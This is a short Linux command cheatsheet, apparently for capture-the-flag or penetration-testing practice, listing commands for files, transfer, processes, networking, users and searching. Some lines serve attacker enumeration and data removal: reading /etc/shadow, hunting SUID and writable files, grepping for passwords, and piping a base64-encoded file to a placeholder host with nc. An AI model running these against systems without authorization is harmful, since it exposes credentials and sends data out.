# Linux Commands Cheatsheet

## File System

```bash
ls -la                          # list all files including hidden
find / -name "*.txt" 2>/dev/null
find / -perm -4000 2>/dev/null  # find SUID files
find / -writable 2>/dev/null    # find writable files/dirs
locate filename
which command
cat /etc/passwd
cat /etc/shadow
cat /etc/hosts
```

## File Transfer

```bash
# Python HTTP server
python3 -m http.server 8080

# Download file
wget http://IP:8080/file.sh -O /tmp/file.sh
curl http://IP:8080/file.sh -o /tmp/file.sh

# SCP
scp user@IP:/path/file .
scp file user@IP:/path/

# Base64 encode/decode
base64 file | nc IP PORT
cat encoded.txt | base64 -d > file
```

## Processes & Services

```bash
ps aux
ps aux | grep root
top
kill -9 PID
systemctl list-units --type=service
crontab -l
cat /etc/crontab
ls /etc/cron.*
```

## Networking

```bash
ip a
ip route
netstat -tulpn
ss -tulpn
arp -a
cat /etc/resolv.conf
ping -c 4 IP
traceroute IP
curl -v http://IP
wget -qO- http://IP
```

## User & Permissions

```bash
whoami
id
sudo -l
groups
cat /etc/passwd | cut -d: -f1  # list users
cat /etc/group
last                            # recent logins
w                               # who is logged in
history
```

## Archive & Compression

```bash
tar -xzf archive.tar.gz
tar -czf archive.tar.gz directory/
zip -r archive.zip directory/
unzip archive.zip
```

## Searching

```bash
grep -r "password" /etc/ 2>/dev/null
grep -rn "flag" /home/ 2>/dev/null
strings binary | grep -i "key\|pass\|flag"
xxd file | head
file unknown_file
```
